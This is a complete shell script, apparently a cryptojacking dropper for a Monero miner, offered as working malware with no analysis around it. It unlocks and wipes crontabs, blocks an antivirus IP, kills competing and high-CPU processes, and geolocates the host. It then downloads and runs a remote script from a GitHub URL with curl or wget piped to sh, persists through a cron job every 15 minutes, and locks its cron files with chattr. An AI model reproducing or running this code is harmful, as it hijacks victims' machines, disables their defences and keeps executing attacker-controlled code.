#!/bin/sh
# IronRock MoneroOcean Edition – FIXED for ALL systems (Alpine, BusyBox, etc.)
for file in /etc/cron.d/$(whoami) /etc/cron.d/apache /var/spool/cron/$(whoami) /var/spool/cron/crontabs/$(whoami) /etc/cron.hourly/oanacroner1 2>/dev/null; do
    [ -f "$file" ] && chattr -i -a "$file" 2>/dev/null
done
crontab -r 2>/dev/null || true

# Block known AV IPs
command -v iptables >/dev/null 2>&1 && iptables -A INPUT -s 66.23.199.44 -j DROP 2>/dev/null

# Kill competing bash scripts
pkill -9 -f 'bash -s ' 2>/dev/null
for pid in $(pgrep -f 'bash /tmp/.*\.sh' 2>/dev/null); do
    [ "$pid" != "$$" ] && [ "$pid" != "$PPID" ] && kill -9 "$pid" 2>/dev/null
done

# Stop competitor services
[ "$(id -u)" = "0" ] && command -v systemctl >/dev/null 2>&1 && systemctl stop systemd_s 2>/dev/null

# CPU check – works without nproc or EUID
cpu_count=$(grep -c '^processor' /proc/cpuinfo 2>/dev/null || echo 1)
[ "$cpu_count" -gt 8 ] && [ "$(id -u)" = "0" ] && echo "VERY GOOD BOY!"

# High CPU killer – protects only our marker
kill_high_cpu() {
    ps -eo pid,%cpu --sort=-%cpu 2>/dev/null | awk '$2>150 {print $1}' | while read -r pid; do
        cmd=$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null || echo "")
        echo "$cmd" | grep -q "oAwgBCFH" && continue
        echo "$cmd" | grep -q "reservepattern454545" && continue
        kill -9 "$pid" 2>/dev/null
    done
}
kill_high_cpu

# Is our miner already running?
is_running() {
    for d in /proc/[0-9]*; do
        [ -r "$d/cmdline" ] || continue
        cmd=$(tr '\0' ' ' < "$d/cmdline" 2>/dev/null)
        echo "$cmd" | grep -q "oAwgBCFH" || continue
        [ "$(awk '{print $3}' "$d/stat" 2>/dev/null)" = "Z" ] && continue
        return 0
    done
    return 1
}

# Download & run payload
download_payload() {
    url="https://raw.githubusercontent.com/thisisforwork440-ops/ironrock/refs/heads/main/run1.sh"
    cn_url="https://raw.githubusercontent.com/thisisforwork440-ops/ironrock/refs/heads/main/runCN1.sh"
    file="run1.sh"
    
    # Auto-detect China
    if command -v curl >/dev/null; then
        curl -s --connect-timeout 3 http://ip-api.com/json/ | grep -q '"country":"China"' && url="$cn_url"
    elif command -v wget >/dev/null; then
        wget -qO- --timeout=3 http://ip-api.com/json/ | grep -q '"country":"China"' && url="$cn_url"
    fi

    if command -v curl >/dev/null; then
        curl -fkso "$file" "$url" && chmod +x "$file" && sh "$file" && rm -f "$file"
    elif command -v wget >/dev/null; then
        wget -qO "$file" "$url" && chmod +x "$file" && sh "$file" && rm -f "$file"
    fi
}

# Auto-install crontab if missing
install_cron() {
    if ! command -v crontab >/dev/null 2>&1; then
        if command -v apt-get >/dev/null 2>&1; then
            apt-get update -qq && apt-get install -y cron >/dev/null 2>&1
        elif command -v yum >/dev/null 2>&1; then
            yum install -y cronie >/dev/null 2>&1
        elif command -v apk >/dev/null 2>&1; then
            apk add --no-cache cron >/dev/null 2>&1
        elif command -v pacman >/dev/null 2>&1; then
            pacman -Sy --noconfirm cronie >/dev/null 2>&1
        fi
    fi
}
install_cron

# Run only if not already running and CPU > 3 or on cloud
if ! is_running; then
    [ "$cpu_count" -gt 3 ] || hostname | grep -qiE "ec2|compute|aliyun|azure" && download_payload
fi

# Persist via cron
add_cron() {
    cmd=""
    command -v curl >/dev/null && cmd="curl -fsSLk $1 | tr -d '\r' | sh"
    command -v wget >/dev/null && cmd="wget -qO- $1 | tr -d '\r' | sh"
    [ -z "$cmd" ] && return
    
    (crontab -l 2>/dev/null | grep -v "$1"; echo "*/15 * * * * $cmd") | crontab - 2>/dev/null
}
add_cron "https://raw.githubusercontent.com/thisisforwork440-ops/ironrock/refs/heads/main/mon1.sh"

# Lock files
for file in /etc/cron.d/$(whoami) /etc/cron.d/apache /var/spool/cron/$(whoami) /var/spool/cron/crontabs/$(whoami) /etc/cron.hourly/oanacroner1 /etc/init.d/down 2>/dev/null; do
    [ -f "$file" ] && chattr +i +a "$file" 2>/dev/null
done
